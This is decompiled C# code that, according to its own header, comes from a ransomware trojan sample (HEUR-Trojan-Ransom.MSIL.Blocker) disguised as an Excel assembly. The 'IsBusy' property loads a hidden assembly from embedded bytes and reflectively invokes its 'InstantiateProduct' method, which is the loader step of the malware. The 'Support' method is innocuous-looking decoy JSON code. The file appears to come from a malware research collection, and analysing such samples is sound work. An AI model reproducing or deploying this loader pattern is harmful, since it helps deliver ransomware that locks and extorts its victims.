// Decompiled with JetBrains decompiler
// Type: Olklwtdpqcgelweitxp.Publisher
// Assembly: Excel, Version=16.0.14326.20404, Culture=neutral, PublicKeyToken=null
// MVID: 084EAF01-576F-4768-A4CB-383D476748C8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2774da0c82b3700d74725edf23bef248083b6df616c7b494c05d4b5aec3ef2f2.exe

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Olklwtdpqcgelweitxp
{
  internal static class Publisher
  {
    public static bool IsBusy
    {
      get
      {
        List<Type> typeList = new List<Type>();
        foreach (Type exportedType in Assembly.Load(Helper.BytesConvertor).GetExportedTypes())
          typeList.Add(exportedType);
        foreach (Type type in typeList.ToArray())
        {
          try
          {
            return (bool) type.InvokeMember("InstantiateProduct", BindingFlags.InvokeMethod, (Binder) null, (object) 0, (object[]) null);
          }
          catch
          {
          }
        }
        return false;
      }
    }

    public static void Support()
    {
      IList<Role> roleList = (IList<Role>) new List<Role>();
      JsonTextReader jsonTextReader = new JsonTextReader((TextReader) new StringReader("{ 'name': 'Admin' }{ 'name': 'Publisher' }"));
      ((JsonReader) jsonTextReader).SupportMultipleContent = true;
      while (((JsonReader) jsonTextReader).Read())
      {
        Role role = new JsonSerializer().Deserialize<Role>((JsonReader) jsonTextReader);
        roleList.Add(role);
      }
      foreach (Role role in (IEnumerable<Role>) roleList)
        Console.WriteLine(role.Name);
    }
  }
}
